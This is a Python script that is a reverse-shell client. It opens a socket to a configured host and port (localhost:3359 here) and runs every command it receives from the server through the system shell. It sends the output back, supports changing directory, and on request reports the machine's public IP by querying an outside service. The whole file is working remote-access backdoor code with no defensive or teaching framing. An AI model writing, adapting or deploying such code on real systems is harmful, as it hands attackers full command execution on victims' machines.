import socket
import subprocess
import sys
import os
import urllib.request
import json

HOST = "localhost"
PORT = 3359

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    # receive command from server
    server_cmd_b = s.recv(1024)
    # convert to sting
    server_cmd_s = server_cmd_b.decode("utf-8")

    if server_cmd_s == "quit":
        s.close()
        sys.exit()
        break

    # change directory if the first 2 letters of server command are cd
    elif server_cmd_s[:2] == "cd":
        os.chdir(server_cmd_s[3:])
        client_response = bytes(os.getcwd(), "utf-8")

    # public ip
    elif server_cmd_s == "r.ip":
        try:
            r = urllib.request.urlopen("https://api.ipify.org/").read().decode("utf-8")
            public_ip = f"[+] client public ip address: {r}"
            client_response = bytes(public_ip, "utf-8")
        except:
            continue
    else:
        # execute command on client machine and send results back to server
        client_cmd = subprocess.Popen(
            server_cmd_s,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )
        client_stdout = client_cmd.stdout.read()
        client_stderr = client_cmd.stderr.read()
        client_response = client_stdout + client_stderr 

    s.send(client_response)
